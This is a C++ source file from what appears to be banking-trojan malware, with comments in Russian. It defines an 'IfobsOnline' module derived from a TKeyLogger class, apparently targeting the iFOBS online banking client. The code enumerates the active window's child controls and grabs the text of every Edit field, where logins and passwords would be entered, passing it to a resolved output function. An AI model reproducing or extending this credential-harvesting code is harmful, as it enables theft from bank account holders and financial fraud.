//---------------------------------------------------------------------------

#pragma hdrstop

#include <windows.h>

#include "IfobsOnline.h"
#include "WndUtils.h"
//---------------------------------------------------------------------------


TIfobsOnline::TIfobsOnline()
	: TKeyLogger()
{

}
//----------------------------------------------------------------------------


BOOL CALLBACK IfobsOnlineEnumWndProc(HWND Wnd, LPARAM Data)
{
	TIfobsOnline* Client = (TIfobsOnline*)Data;

	Client->AddWndData(Wnd);

	EnumChildWindows(Wnd, IfobsOnlineEnumWndProc, Data);

	return TRUE;
}



//-----------------------------------------------------
//  BindData - Функция запускает перебор окон для сбора
//             необъодимых данных
//-----------------------------------------------------
void TIfobsOnline::BindData()
{
	HWND TopWnd = GetActiveWindow();
	EnumChildWindows(TopWnd, IfobsOnlineEnumWndProc, (LPARAM)this);
}
//----------------------------------------------------------------------------

void TIfobsOnline::AddWndData(HWND Wnd)
{
	string Class = GetWndClassName2(Wnd);
	if (Class == "Edit")
	{
		string Text = GetWndText2(Wnd);
		pOutputDebugStringA(Text.t_str());
	}
}
